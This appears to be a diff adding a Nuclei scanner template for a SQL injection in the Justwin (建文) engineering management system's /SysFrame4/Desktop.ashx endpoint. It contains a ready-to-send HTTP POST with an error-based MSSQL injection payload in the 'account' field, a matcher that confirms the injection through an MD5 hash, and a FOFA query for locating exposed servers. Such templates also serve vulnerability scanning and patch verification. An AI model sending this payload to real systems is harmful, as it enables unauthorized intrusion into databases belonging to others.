@@ -1,0 +1,26 @@
+id: justwin-gcgl-Desktop-sqli
+
+info:
+  name: justwin-gcgl-Desktop-sqli
+  author: unknow
+  severity: high
+  description: 建文工程管理系统/SysFrame4/Desktop.ashx 存在SQL注入漏洞
+  tags: justwi,sqli
+  metadata:
+    fofa-qeury: body="Login/QRLogin.ashx"
+
+http:
+  - raw:
+      - |              
+        POST /SysFrame4/Desktop.ashx HTTP/1.1
+        Host: 
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        account=1'+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32))<0--&method=isChangePwd&pwd=
+
+    matchers:     
+      - type: dsl
+        name: sqli
+        dsl:
+          - "status_code == 200 && contains(body,'e165421110ba03099a1c0393373c5b43') && contains(header,'text/plain')" 
